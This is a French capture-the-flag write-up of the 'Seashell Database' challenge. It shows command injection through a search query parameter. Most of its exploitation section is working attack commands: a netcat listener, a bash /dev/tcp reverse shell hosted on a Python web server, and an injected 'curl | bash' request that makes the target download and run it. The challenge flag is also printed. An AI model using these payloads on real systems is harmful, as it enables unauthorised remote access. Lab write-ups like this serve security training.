# Seashell Database

Il s'agit d'une page web dans laquelle nous avons une barre de recherche pour interroger une database.

Voici la query de base capturée avec BurpSuite : 

![image.png](Seashell%20database/image.png)

Essayons de remplacer la query par cmd.

Nous n’avons aucun retour sur nos inputs, j’ai donc décidé de me pinguer, et d’écouter avec un tcpdump ICMP pour vérifier le fonctionnement de mon payload :

![image.png](Seashell%20database/image%201.png)

![image.png](Seashell%20database/image%202.png)

Super cmd fonctionne et à priori le firewall ne posera pas de problème.

Allons sur https://www.revshells.com/

Après avoir tester plusieurs types de shell, je comprends qu'il y a sûrement des restrictions sur les exécutables du serveur.

Je tente une injection de %00 byte null pour générer une erreur et obtenir un retour mais cela rate.

je suis revenu en arrière et j'ai tenté une commande sleep avec query : `?query=test%27%3Bsleep+5%3B%27`

j’arrive bien à exécuter la commande sleep

Après avoir tenté plein d'exécutables pour le reverse shell, je comprends que seul curl est possible, le problème c'est qu'il n'est pas interactif.

j’ai donc ouvert un server Python et j’ai hébergé mon reverse shell dessus et j’ai fait curl la victime sur mon reverse shell pour qu'il le télécharge et l'exécute.

Pendant ce temps j’écoutais via un autre terminal.

# Exploitation

`sudo nc -lvnp 9001`

Nous créons notre reverse shell et le déposons dans notre serveur.
`echo 'bash -i >& /dev/tcp/MY_IP/9001 0>&1' > shell.sh`

`python3 -m http.server 8000`

Voici la RCE utilisée : 

`GET /?query=test%27%3Bcurl+http://MY_IP:8000/shell.sh+|+bash%3B%27`

On utilise `curl | bash` pour que le serveur download et exécute le shell.

On remarque qu’il y a un dossier Departments qui est inhabituel donc on cherche le flag dedans :`grep -R "DVC{" /Departments 2>/dev/null`

/Departments/Marine_Biology/Seashell_Database/666c6167.txt:
`DVC{RCEs_4r3_R34lLy_fUn!}`